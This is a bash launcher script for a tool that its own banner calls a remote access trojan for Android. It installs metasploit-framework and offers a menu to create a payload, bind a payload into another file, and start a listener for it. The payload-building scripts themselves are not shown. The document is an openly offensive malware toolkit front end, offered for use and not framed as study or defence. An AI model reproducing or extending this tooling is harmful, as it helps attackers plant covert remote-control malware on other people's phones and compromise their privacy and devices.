#!/bin/bash

echo "Checking For Root User...."
sleep 1
if [[ $(id -u) -eq 0 ]] ; then 
   echo "Running as Root User - Full access available" ; 
else 
   echo "Running as Non-Root User - Limited access" ; 
fi

echo "Checking For Requirement Packages.."

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install package with appropriate privileges
install_package() {
    local pkg=$1
    if command_exists "$pkg"; then
        echo "$pkg is already installed"
        return 0
    fi
    
    if [[ $(id -u) -eq 0 ]]; then
        # Running as root - use apt directly
        apt install -y "$pkg"
    else
        # Running as non-root - use sudo if available, otherwise skip
        if command_exists sudo; then
            sudo apt install -y "$pkg"
        else
            echo "Warning: Cannot install $pkg - no root access and sudo not available"
            echo "Some features may not work properly"
            return 1
        fi
    fi
}

# Check and install required packages
pkgs=(metasploit-framework)
for pkg in ${pkgs[@]}
do
    install_package "$pkg"
done

sleep 1
clear

echo "Required Packages Check Completed"

# Function to display the menu
show_menu() {
    clear
 echo -e "\033[0;37m------------------------------------------------" 
echo "     ╔═╗       ╔═╗╔═╗╔═╗╦╔═╗╔╦╗╦ ╦          ╦═╗  ╔═╗  ╔╦╗     "
echo "     ╠╣   ───  ╚═╗║ ║║  ║║╣  ║ ╚╦╝          ╠╦╝  ╠═╣   ║      "
echo "     ╚         ╚═╝╚═╝╚═╝╩╚═╝ ╩  ╩           ╩╚═  ╩ ╩   ╩      "
echo -e "\033[0;31m            POWER OF ATHEX BLACK H4T             "
echo -e "\033[0;29m             REMOTE ACCESS TROJAN FOR ANDROID    "
    echo -e "\033[0;37m---------------------------------------------" 
    echo -e "\033[0;29m"
    echo -e "\033[0;37m [1]\033[0;29m Create A Payload"
    echo -e "\033[0;37m [2]\033[0;29m Bind A Payload"
    echo -e "\033[0;37m [3]\033[0;29m Create A Listener For A Previous Payload"
    echo -e "\033[0;37m [0]\033[0;31m EXIT"
    echo -e "\033[0;36m"
    echo -n " Please select an option: "
}

# Function to run scripts with appropriate privileges
run_script() {
    local script=$1
    if [[ -f "$script" ]]; then
        if [[ $(id -u) -eq 0 ]]; then
            bash "$script"
        else
            # Try to run without root, script should handle non-root execution
            bash "$script"
        fi
    else
        echo "Error: Script $script not found!"
        echo "Press any key to continue..."
        read -n 1
    fi
}

# Function to handle the user's selection
handle_choice() {
    case $1 in
        1) run_script "src/payload-gen.sh";;
        2) run_script "src/binder.sh";;
        3) run_script "src/listner.sh";;
        0) echo "Exiting..."; exit 0;;
        *) echo "Invalid option";;
    esac
}

# Main loop to show the menu and handle choices
while true; do
    show_menu
    read choice
    handle_choice $choice
    echo -e "\nPress any key to return to the menu..."
    read -n 1
done